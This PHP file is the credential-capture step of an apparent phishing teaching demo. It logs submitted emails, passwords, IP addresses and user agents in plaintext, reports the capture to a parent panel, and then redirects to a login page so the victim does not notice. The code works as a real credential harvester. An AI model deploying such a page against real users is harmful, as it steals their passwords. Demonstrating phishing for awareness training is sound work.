<?php
/* Collect credentials: append to ../Data/phished.jsonl and notify the parent panel
   that credentials have been captured. */
session_start();

/* ---------- Paths & writability checks ---------- */
$logFile = __DIR__ . '/../Data/phished.jsonl';
$logDir  = dirname($logFile);

/* Attempt to create the log directory if it does not exist. */
if (!is_dir($logDir)) {
    if (!@mkdir($logDir, 0777, true)) {
        error_log("Phishing demo: failed to create directory $logDir");
    }
}
/* Ensure the directory is writable (log to PHP error_log on failure). */
if (!is_writable($logDir)) {
    error_log("Phishing demo: log directory not writable: $logDir");
}

header('Content-Type: text/html; charset=utf-8');

/* ---------- Read submitted fields ---------- */
$email    = $_POST['email']    ?? '';
$password = $_POST['password'] ?? '';
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip       = $_SERVER['REMOTE_ADDR']     ?? '';

/* Record (JSON Lines format: one JSON object per line). */
$rec = [
  'ts'       => date('c'),
  'email'    => $email,
  'password' => $password,
  'ua'       => $ua,
  'ip'       => $ip,
  'track'    => 'attack'  // Source marker: PhishAttack
];

/* ---------- Append (with LOCK_EX) and check result ---------- */
$line    = json_encode($rec, JSON_UNESCAPED_UNICODE) . PHP_EOL;
$written = @file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
$write_ok = ($written !== false);
if (!$write_ok) {
    error_log("Phishing demo: failed to write phished.jsonl -> $logFile");
}

/* Masked email for UI hints (first char + *** + domain). */
$emailMasked = $email ? preg_replace('/^(.)(.*)(@.*)$/u', '$1***$3', $email) : '';

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Signing in… (Teaching Demo)</title>
<style>
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
    background:#fff;margin:0;display:flex;align-items:center;justify-content:center;min-height:60vh
  }
  .box{max-width:420px;border:1px solid #e5e7eb;border-radius:12px;padding:16px}
  h3{margin:0 0 8px 0}
  p{margin:6px 0;color:#475569}
  .muted{color:#64748b;font-size:13px}
</style>
</head>
<body>
  <div class="box">
    <h3>Signing in…</h3>
    <p>Please wait while we verify your identity. (Teaching demo)</p>
  </div>

<script>
(function(){
  // Notify the parent panel: credentials were captured (immediate leakage) + write status.
  try{
    window.parent && window.parent.postMessage({
      type: 'CREDENTIALS_CAPTURED',
      emailMasked: <?= json_encode($emailMasked, JSON_UNESCAPED_UNICODE) ?>,
      ts: '<?= date("H:i:s") ?>',
      writeOk: <?= $write_ok ? 'true' : 'false' ?>
      // For deeper debugging, you could include an error reason,
      // but here we only return a boolean to avoid leaking server paths.
    }, '*');
  }catch(e){}

  // After 1.2s, redirect back to the “real site” login to reinforce authenticity.
  setTimeout(function(){
    location.href = '../Secure/login.php';
  }, 1200);
})();
</script>
</body>
</html>
